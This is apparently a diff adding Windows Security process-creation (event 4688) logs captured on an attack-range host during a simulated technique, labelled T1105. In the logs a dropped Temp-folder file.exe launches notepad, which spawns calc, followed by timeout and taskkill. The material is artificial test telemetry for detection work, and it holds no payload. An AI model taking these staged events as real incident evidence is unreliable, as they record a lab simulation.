@@ -1,0 +1,2465 @@
+02/16/2022 08:58:04 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52746897
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x16f0
+	New Process Name:	C:\Windows\System32\taskkill.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	Taskkill  /IM Calculator.exe /F
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:58:04 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52746864
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E4
+
+Process Information:
+	New Process ID:		0x88c
+	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x2c8
+	Creator Process Name:	C:\Windows\System32\svchost.exe
+	Process Command Line:	C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:58:04 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52746853
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x6dc
+	New Process Name:	C:\Windows\System32\taskkill.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	Taskkill  /IM notepad.exe /F
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744400
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1f74
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1f1c
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744373
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1694
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x142c
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744372
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x136c
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x4e4
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744371
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x19e4
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xac0
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744370
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xc9c
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x9b0
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744369
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x121c
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xa40
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744368
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1d94
+	New Process Name:	C:\Windows\System32\win32calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1a28
+	Creator Process Name:	C:\Windows\System32\calc.exe
+	Process Command Line:	"C:\Windows\System32\win32calc.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744196
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2a0
+	New Process Name:	C:\Windows\System32\svchost.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x258
+	Creator Process Name:	C:\Windows\System32\services.exe
+	Process Command Line:	C:\Windows\system32\svchost.exe -k wsappx
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744192
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x4e4
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1780
+	Creator Process Name:	C:\Windows\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744186
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x117c
+	New Process Name:	C:\Windows\System32\timeout.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	timeout  /T 10
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744177
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x142c
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1780
+	Creator Process Name:	C:\Windows\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744176
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x9b0
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xed0
+	Creator Process Name:	C:\Windows\System32\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744166
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1a28
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xed0
+	Creator Process Name:	C:\Windows\System32\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744165
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1780
+	New Process Name:	C:\Windows\notepad.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1f84
+	Creator Process Name:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
+	Process Command Line:	"C:\Windows\notepad.exe"
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744159
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa40
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xed0
+	Creator Process Name:	C:\Windows\System32\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744158
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1f1c
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xed0
+	Creator Process Name:	C:\Windows\System32\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744157
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xac0
+	New Process Name:	C:\Windows\System32\calc.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xed0
